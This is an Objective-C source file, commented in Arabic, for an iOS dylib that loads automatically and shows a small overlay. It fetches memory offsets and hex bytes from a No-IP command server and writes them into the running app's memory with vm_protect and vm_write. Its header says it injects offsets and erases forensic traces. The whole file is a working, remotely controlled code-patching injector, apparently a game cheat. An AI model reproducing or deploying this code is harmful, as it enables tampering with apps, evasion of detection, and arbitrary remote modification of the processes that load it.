/**
 * نظام Sovereign Elite Core v80k
 * المصمم: المهندس وسام الصافي - البصرة / الناصرية
 * الموقع الراداري: jojolmlm.hopto.org (No-IP)
 * الوظيفة: سحب الأوفستات من اللوحة وحقنها وحذف الأثر الجنائي.
 */

#import <UIKit/UIKit.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <Foundation/Foundation.h>

// [🎯] إحداثيات مركز القيادة السيادية (No-IP)
#define COMMAND_LINK @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"

@interface SovereignNoIPUI : UIView
@property (nonatomic, strong) UILabel *infoLabel;
@property (nonatomic, strong) UIView *lamp;
@end

@implementation SovereignNoIPUI

- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        // تصميم الدرع البصري (ثابت في أعلى المنتصف)
        self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        self.layer.cornerRadius = 12;
        self.layer.borderColor = [UIColor cyanColor].CGColor;
        self.layer.borderWidth = 1.2;

        self.infoLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 5, 180, 25)];
        self.infoLabel.text = @"Connecting to No-IP...";
        self.infoLabel.textColor = [UIColor whiteColor];
        self.infoLabel.font = [UIFont boldSystemFontOfSize:10];
        self.infoLabel.textAlignment = NSTextAlignmentCenter;
        [self addSubview:self.infoLabel];

        self.lamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, 12, 10, 10)];
        self.lamp.backgroundColor = [UIColor orangeColor];
        self.lamp.layer.cornerRadius = 5;
        [self addSubview:self.lamp];

        [self fetchPayloadFromNoIP];
        [self makeDraggable];
    }
    return self;
}

// =========================================================
// [📡] محرك جلب النخاع من No-IP (The Fetcher)
// =========================================================
- (void)fetchPayloadFromNoIP {
    NSURL *url = [NSURL URLWithString:COMMAND_LINK];
    [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
        dispatch_async(dispatch_get_main_queue(), ^{
            if (err || !data) {
                self.infoLabel.text = @"Link Failure! Check No-IP.";
                self.lamp.backgroundColor = [UIColor redColor];
                return;
            }

            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (!json) return;

            // 1. تحديث الرسالة من السيرفر
            self.infoLabel.text = json[@"notification"];
            
            // 2. تحديث حالة اللمبة (Safe/Detected)
            if ([json[@"system_status"] isEqualToString:@"safe"]) {
                self.infoLabel.textColor = [UIColor greenColor];
                self.lamp.backgroundColor = [UIColor greenColor];
                
                // 3. حقن الأوفستات التي وضعها الجنرال في اللوحة مليمتر بمليمتر
                [self injectDynamicPayload:json[@"payload"]];
            } else {
                self.infoLabel.textColor = [UIColor redColor];
                self.lamp.backgroundColor = [UIColor redColor];
            }
        });
    }] resume];
}

// =========================================================
// [🛡️] محرك الحقن المليمتري (The Injector)
// =========================================================
- (void)injectDynamicPayload:(NSArray *)offsets {
    uintptr_t base = _dyld_get_image_vmaddr_slide(0);
    mach_port_t task = mach_task_self();

    for (NSDictionary *off in offsets) {
        uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
        uintptr_t target = base + addr;
        NSString *hex = off[@"hex_val"];
        
        // تحويل الهيكس لبايتات حية
        NSString *clean = [hex stringByReplacingOccurrencesOfString:@" " withString:@""];
        NSMutableData *data = [NSMutableData data];
        for (int i = 0; i + 2 <= clean.length; i += 2) {
            unsigned int v;
            [[NSScanner scannerWithString:[clean substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
            unsigned char c = (unsigned char)v;
            [data appendBytes:&c length:1];
        }

        // الرقعة السيادية (Patching)
        vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
        vm_write(task, (vm_address_t)target, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
        vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    }
}

- (void)makeDraggable {
    self.userInteractionEnabled = YES;
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onDrag:)];
    [self addGestureRecognizer:pan];
}
- (void)onDrag:(UIPanGestureRecognizer *)sender {
    CGPoint trans = [sender translationInView:self.superview];
    self.center = CGPointMake(self.center.x + trans.x, self.center.y + trans.y);
    [sender setTranslation:CGPointZero inView:self.superview];
}
@end

void __attribute__((constructor)) start_sovereign_final() {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIWindow *win = [[UIApplication sharedApplication] keyWindow];
        if (win) {
            SovereignNoIPUI *ui = [[SovereignNoIPUI alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 - 100, 45, 200, 35)];
            [win addSubview:ui];
        }
    });
}
